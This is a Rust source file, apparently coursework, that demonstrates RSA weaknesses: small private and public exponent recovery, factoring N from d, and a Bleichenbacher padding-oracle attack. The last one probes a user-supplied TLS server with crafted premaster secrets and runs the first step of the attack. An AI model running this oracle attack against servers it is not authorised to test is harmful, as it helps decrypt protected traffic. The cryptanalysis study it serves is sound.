use hex::FromHex;
use rug::{rand::RandState, Integer, integer::Order};
use ssl_attack::{euclides_gmp, get_rsa_from_server, bleichenbacher_oracle};
use std::{env, io::{Write}};

static CHOICE: [&str; 5] = ["RSA Example",
                            "Small Private Exponent Example",
                            "Facotrization of N given d",
                            "Bleichenbacher attack",
                            "Small public exponent example"];

fn help() {
    println!("Usage: ssl_attack <OPTION> [host] [port]\nOPTION:");
    for (i, line) in CHOICE.iter().enumerate() {
        println!("\t{} - {}", i, line);
    }
}

fn small_private_exponent() {
    let n_str: &str = "12264905917816263700023515448393777708967552173712358109109
    112075721236843318505659070851271440997802106172180323874308937701712523347009
    782826738112981152721181778312786319011587166390909385674403046948259826198367
    163684777710906230670403185358699858972062054236279922545535821691078128330482
    8215788728105359";
    let e_str: &str = "84617501727888423821133596441571121520815397643225089934444
    436349502681518935293555531766824573098497372564373307288536035855002783639020
    298535325660076402607034399890585937330747894532573222022139028813064683258751
    982767855873792842547077447226443256890881420825829634680197242864699416061217
    480750109412593";
    let n: Integer = n_str.parse::<Integer>().unwrap();
    let e: Integer = e_str.parse::<Integer>().unwrap();

    let message: &str = "Other secret message";
    let m: Integer = Integer::from_digits(message.as_bytes(), Order::MsfBe);
    let c = m.pow_mod(&e, &n).unwrap();

    let mut num: Integer = e.clone();
    let mut den: Integer = n.clone();
    let mut q: Integer;
    let (_, mut r) = num.clone().div_rem(den.clone());
    let mut d1: Integer = Integer::from(1);
    let mut d2: Integer = Integer::from(0);
    let mut d: Integer;
    let mut m: Integer;

    while r != Integer::ZERO {
        num = den.clone();
        den = r.clone();
        (q, r) = num.clone().div_rem(den.clone());
        d = q.clone() * d1.clone() + d2.clone();

        m = match c.clone().pow_mod(&d, &n) {
            Ok(m) => m,
            Err(_) => unreachable!(),
        };

        let arr: Vec<u8> = m.to_digits::<u8>(Order::MsfLe);
        let mut str: String = String::new();
        for i in arr {
            str.push(i as char);
        }
        if str.is_ascii() {
            println!("Decrypted message: {}", str);
            break;
        }
        d2 = d1.clone();
        d1 = d.clone();
    }
    println!("Here is your private key: {}", d1);
}

fn small_public_exponent() {
    let n_str: &str = "29331922499794985782735976045591164936683059380558950386560
    160105740343201513369939006307531165922708949619162698623675349030430859547825
    708994708321803705309459438099340427770580064400911431856656901982789948285309
    956111848686906152664473350940486507451771223435835260168971210087470894448460
    745593956840586530527915802541450092946574694809584880896601317519794442862977
    471129319781313161842056501715040555964011899589002863730868679527184420789010
    551475067862907739054966183120621407246398518098981106431219207697870293412176
    440482900183550467375190239898455201170831410460483829448603477361305838743852
    756938687673";
    let n: Integer = n_str.parse::<Integer>().unwrap();
    let e: Integer = Integer::from(3);

    let message: &str = "Super secret message";
    let m: Integer = Integer::from_digits(message.as_bytes(), Order::MsfBe);
    let c: Integer = m.pow_mod(&e, &n).unwrap();
    println!("Here is your ciphertext: {}", c);

    let (res, k) = small_e(n, c, e);
    println!("Decrypted message: {}", res);
    println!("k is: {}", k);

    pub fn small_e(n: Integer, c: Integer, e: Integer) -> (String, i32) {
        let mut arr: Vec<u8>;
        let mut m: Integer;
    
        for i in 0..10000 {
            m = c.clone() + i*n.clone();
            m = m.root(e.to_u32_wrapping());
            arr = m.to_digits::<u8>(Order::MsfBe);
            let mut str: String = String::new();
            for j in arr.clone() {
                str.push(j as char);
            }
            if str.is_ascii() {
                return (str,i);
            }
        }
        return (String::from(""), -1);
    }
}

fn factor_n_example() {
    let n_str: &str = "12264905917816263700023515448393777708967552173712358109109
    112075721236843318505659070851271440997802106172180323874308937701712523347009
    782826738112981152721181778312786319011587166390909385674403046948259826198367
    163684777710906230670403185358699858972062054236279922545535821691078128330482
    8215788728105359";
    let e_str: &str = "84617501727888423821133596441571121520815397643225089934444
    436349502681518935293555531766824573098497372564373307288536035855002783639020
    298535325660076402607034399890585937330747894532573222022139028813064683258751
    982767855873792842547077447226443256890881420825829634680197242864699416061217
    480750109412593";
    let n: Integer = n_str.parse::<Integer>().unwrap();
    let e: Integer = e_str.parse::<Integer>().unwrap();
    let d: Integer = Integer::from(65537);

    let k: Integer = e*d - Integer::from(1);
    let mut t_int: u16 = 0;
    let mut r: Integer = k.clone();
    while r.is_even() {
        r = r/2;
        t_int += 1;
    }
    let t: Integer = Integer::from(t_int);

    println!("k = 2^{} * {}", t, r);
    let mut x: Integer;
    let mut p: Integer;
    let mut q: Integer;
    for i in 1..t_int {
        let tmp = &k / Integer::from((2 as u32).pow(i.into()));
        x = Integer::from(3).pow_mod(&tmp, &n).unwrap();
        p = (&x - Integer::from(1)).gcd(&n);
        q = (&x + Integer::from(1)).gcd(&n);
        if p.clone() == Integer::from(1) || q.clone() == Integer::from(1) {
            continue;
        }
        if n == p.clone() * q.clone() {
            println!("Here is p: {}\nHere is q: {}", &p, &q);
        }
    }
}

fn rsa_example() {
    let p: Integer = Integer::from(7919);
    let q: Integer = Integer::from(6841);
    let n: Integer = p.clone() * q.clone();
    let phi: Integer = (p - 1) * (q - 1);
    let mut rand: RandState = RandState::new();
    let mut e: Integer = phi.clone().random_below(&mut rand);
    let mut res = euclides_gmp(e.clone(), phi.clone());
    while res.0 != 1 {
        e = phi.clone().random_below(&mut rand);
        res = euclides_gmp(e.clone(), phi.clone());
    }
    let d: Integer;
    if res.1 < 0 {
        d = res.1 + n.clone();
    } else {
        d = res.1;
    }
    println!("Generated key ({}, {}), {}", n, e, d);

    let text: String = String::from("Hi!");
    let mut bytes: Vec<u8> = Vec::new();
    for i in text.chars() {
        bytes.push(i as u8);
    }
    let m: i128 = Integer::from_digits(&bytes, Order::MsfLe).to_i128_wrapping();
    println!("Message to encrypt: {} = {}", text, m);

    let c: Integer = match Integer::from(m).pow_mod(&e.clone(), &n.clone()) {
        Ok(c) => c, //.to_i128_wrapping(),
        Err(_) => unreachable!(),
    };
    
    print!("Encrypted message: {} = [", &c);
    for i in c.to_digits::<u8>(Order::MsfBe) {
        print!("{},", i);
    }
    println!("]");

    let dec = match Integer::from(c).pow_mod(&d, &n) {
        Ok(dec) => dec.to_i128_wrapping(),
        Err(_) => unreachable!(),
    };
    let mut tmp: String = String::new();
    for i in Integer::from(dec).to_digits::<u8>(Order::MsfBe) {
        tmp.push(i as char);
    }
    println!("Decrypted message: {} = {}", dec, tmp);
}

fn bleichenbacher_example(host: String, port: u16) {

    let (n, e) = get_rsa_from_server(host.clone(), port.clone());
    println!("n: {}\ne: {}", n, e);

    let modulus_bytes = n.to_digits::<u8>(Order::MsfLe).len();
    let modulus_bits = &modulus_bytes * 8;

    println!("Modulus bits: {}", modulus_bits);
    println!("Modulus bytes: {}", modulus_bytes);

    let pad_len = (modulus_bytes - 48 - 3) * 2;
    let len  = (pad_len / 2) as i32 + 1;
    let mut rnd_pad = String::new();
    for _i in 1..len {
        rnd_pad += "abcd";
    }
    rnd_pad.drain(pad_len..rnd_pad.len());
    println!("Pad len: {}\nRnd pad len: {}", pad_len, rnd_pad.len());

    let hex_test = Vec::from_hex("aa11").unwrap();
    let int_test = Integer::from_digits(hex_test.as_slice(), Order::MsfLe);
    println!("Integer: {}", int_test);

    let rnd_pms = "aa1122334455667788991122334455667788
        99112233445566778899112233445566778899112233445566778
        899".replace("\n","").replace(" ","");
    let pms_good_str = String::from("0002") + &rnd_pad + "000303" + &rnd_pms;
    let pms_good_vec = Vec::from_hex(pms_good_str).unwrap();
    let pms_good_in = Integer::from_digits(pms_good_vec.as_slice(), Order::MsfLe);
    // wrong first two bytes
    let pms_bad_str1 = String::from("4117") + &rnd_pad + "00" + "0303" + &rnd_pms;
    let pms_bad_vec1 = Vec::from_hex(pms_bad_str1).unwrap();
    let pms_bad_in1 = Integer::from_digits(pms_bad_vec1.as_slice(), Order::MsfBe);
    // 0x00 on a wrong position, also trigger older JSSE bug
    let pms_bad_str2 = String::from("0002") + &rnd_pad + "11" + &rnd_pms + "0011";
    let pms_bad_in2 = Integer::from_digits(pms_bad_str2.as_bytes(), Order::MsfBe);
    // no 0x00 in the middle
    let pms_bad_str3 = String::from("0002") + &rnd_pad + "11" + "1111" + &rnd_pms;
    let pms_bad_in3 = Integer::from_digits(pms_bad_str3.as_bytes(), Order::MsfBe);
    // wrong version number (according to Klima / Pokorny / Rosa paper)
    let pms_bad_str4 = String::from("0002") + &rnd_pad + "00" + "0202" + &rnd_pms;
    let pms_bad_in4 = Integer::from_digits(pms_bad_str4.as_bytes(), Order::MsfBe);

    let pms_good = pms_good_in.pow_mod(&e, &n).unwrap()
        .to_digits::<u8>(Order::MsfBe);
    println!("pms good {}", pms_good.as_slice().escape_ascii().to_string());
    println!("length {}", pms_good.len());
    let pms_bad1 = pms_bad_in1.pow_mod(&e, &n).unwrap()
        .to_digits::<u8>(Order::MsfBe);
    let pms_bad2 = pms_bad_in2.pow_mod(&e, &n).unwrap()
        .to_digits::<u8>(Order::MsfBe);
    let pms_bad3 = pms_bad_in3.pow_mod(&e, &n).unwrap()
        .to_digits::<u8>(Order::MsfBe);
    let pms_bad4 = pms_bad_in4.pow_mod(&e, &n).unwrap()
        .to_digits::<u8>(Order::MsfBe);

    let good = bleichenbacher_oracle(host.clone(), port.clone(), &pms_good);
    let bad1 = bleichenbacher_oracle(host.clone(), port.clone(), &pms_bad1);
    let bad2 = bleichenbacher_oracle(host.clone(), port.clone(), &pms_bad2);
    let bad3 = bleichenbacher_oracle(host.clone(), port.clone(), &pms_bad3);
    let bad4 = bleichenbacher_oracle(host.clone(), port.clone(), &pms_bad4);

    println!("is good good: {}, {}", good.is_ok(), good.unwrap());
    println!("is bad1 good: {}, {}", bad1.is_ok(), bad1.unwrap_or_default());
    println!("is bad2 good: {}, {}", bad2.is_ok(), bad2.unwrap_or_default());
    println!("is bad3 good: {}, {}", bad3.is_ok(), bad3.unwrap_or_default());
    println!("is bad4 good: {}, {}", bad4.is_ok(), bad4.unwrap_or_default());

    //blinding
    let c_str = "49 2d ab 7c 1f 1d 33 db d1 d6 db e7 57 
            c8 ec 47 31 f4 3c bf 43 94 16 85 6d b2 65 97
            07 59 e7 d8 43 9f 8e 46 cc a1 8b c7 28 df e0
            67 93 03 d2 66 c1 44 ea 05 e4 51 2c 6f 23 42
            d6 09 e4 36 37 6a 72 8d cd a7 6f 4a 75 01 c2
            ef 8b 45 a8 39 e9 3a 5a 07 6b 29 35 3d 4d 9e
            15 59 06 6c d4 61 21 8c c1 8e e2 89 7d b9 e7
            f7 d6 66 9b 66 54 2f 4a 2d d0 9c ac f1 99 4f
            49 67 61 01 0d 5f a2 83 3a 9c 27 2f 64 74 6a
            24 c4 b8 a9 9c e2 a3 df b8 68 9f 23 9b 73 6e
            6a fa 2a a6 d0 a4 94 3c 94 25 f8 19 f4 87 4d
            5f be 0c 97 a0 33 e3 1e dc d9 5b 46 c4 b1 88
            37 22 14 80 07 22 4c a8 c8 da d7 4f 48 06 48
            d4 d5 3e 8a 73 74 aa cd 55 b2 64 bc 77 73 40
            7b 96 6e 2a 72 e7 39 4e 54 f2 5b b7 cc eb c5
            73 36 cc d0 66 e1 35 38 2e cb 50 29 38 f5 35
            a5 1f f0 74 95 5a 64 4a 1f b6 88 d1 6d c5 0c
            6a da a7";
    let c = Vec::from_hex(c_str.replace(" ","").replace("\n","")).unwrap();
    let mut count = 0;
    let mut s0 = 1;
    let mut c0 = Integer::from(s0).pow_mod(&e, &n).unwrap() 
        * Integer::from_digits(&c, Order::MsfBe);
    loop {
        if count % 1000 == 0 {
            println!("{} query", count);
        }
        match bleichenbacher_oracle(host.clone(), 
            port.clone(), 
            &c0.to_digits::<u8>(Order::MsfBe)) {
                Ok(_) => break,
                Err(_) => ()
            };
        s0 += 1;
        c0 = Integer::from(s0).pow_mod(&e, &n).unwrap() 
            * Integer::from_digits(&c, Order::MsfBe);
        count += 1;
    }
    println!("s0: {}", s0);
}

fn main() {

    // can arguments be overflown ?
    let args: Vec<String> = env::args().collect();

    let mut line_buffer = String::new();
    let choice: String;
    let decision:i8;
    if args.len() < 2 {
        help();
        print!("Choose what you want to run [0-1]: ");
        std::io::stdout().flush().unwrap();
        choice = match std::io::stdin().read_line(&mut line_buffer) {
            Ok(_) => line_buffer.replace("\n", ""),
            Err(_) => String::from("-1"),
        };
    } else {
        choice = String::from(&args[1]);
    }

    decision = match choice.parse::<i8>() {
        Ok(dec) => dec,
        Err(_) => -1,
    };

    match decision {
        0 => rsa_example(),
        1 => small_private_exponent(),
        2 => factor_n_example(),
        3 => {
            if args.len() > 3 {
                bleichenbacher_example(args[2].clone(), 
                    args[3].parse::<u16>().unwrap());
            } else {
                println!("Needs host and port argument!");
            }
        },
        4 => small_public_exponent(),
        _ => help(),
    }
}